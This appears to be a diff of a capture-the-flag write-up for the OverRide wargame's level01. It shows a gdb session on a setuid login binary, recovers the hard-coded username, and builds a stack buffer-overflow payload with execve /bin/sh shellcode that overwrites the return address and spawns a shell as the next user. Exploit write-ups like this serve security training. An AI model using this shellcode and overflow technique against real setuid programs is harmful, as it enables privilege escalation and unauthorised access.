@@ -1,10 +1,13 @@
 level01@OverRide:~$ whoami
 level01
+
 level01@OverRide:~$ pwd
 /home/users/level01
+
 level01@OverRide:~$ ls -l
 total 8
 -rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01
+
 level01@OverRide:~$ ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: Username
@@ -13,10 +16,12 @@ verifying username....
 nope, incorrect username...
 
 level01@OverRide:~$ gdb ./level01
+
 (gdb) info variables
 ...
 0x0804a040  a_user_name
 ...
+
 (gdb) info functions
 All defined functions:
 ...
@@ -24,6 +29,7 @@ All defined functions:
 0x080484a3  verify_user_pass
 0x080484d0  main
 ...
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x080484d0 <+0>:	push   %ebp
@@ -84,6 +90,7 @@ Dump of assembler code for function main:
    0x080485b4 <+228>:	pop    %ebp
    0x080485b5 <+229>:	ret
 End of assembler dump.
+
 (gdb) disas verify_user_name
 Dump of assembler code for function verify_user_name:
    0x08048464 <+0>:	push   %ebp
@@ -111,6 +118,7 @@ Dump of assembler code for function verify_user_name:
    0x080484a1 <+61>:	pop    %ebp
    0x080484a2 <+62>:	ret
 End of assembler dump.
+
 (gdb) disas verify_user_pass
 Dump of assembler code for function verify_user_pass:
    0x080484a3 <+0>:	push   %ebp
@@ -135,6 +143,7 @@ Dump of assembler code for function verify_user_pass:
    0x080484ce <+43>:	pop    %ebp
    0x080484cf <+44>:	ret
 End of assembler dump.
+
 ********************************************************************************
 We can see that the main function is a kind of log procedure:
 We are prompted for an username, which is stored in a global stack buffer,
@@ -146,10 +155,14 @@ So we just have to store a shellcode in the first buffer, get its start address,
 and write it in eip by overflowing the password stack buffer. Vanilla stuff.
 We start by getting the hard-coded value of the password.
 ********************************************************************************
+
 (gdb) x/1s 0x080486a8
 0x80486a8:	 "dat_wil"
+
 (gdb) q
+
 level01@OverRide:~$ python -c "print('dat_wil ' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\n' + 'a' * 80 + '\x48\xa0\x04\x08')" > /tmp/payload
+
 level01@OverRide:~$ cat /tmp/payload - | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
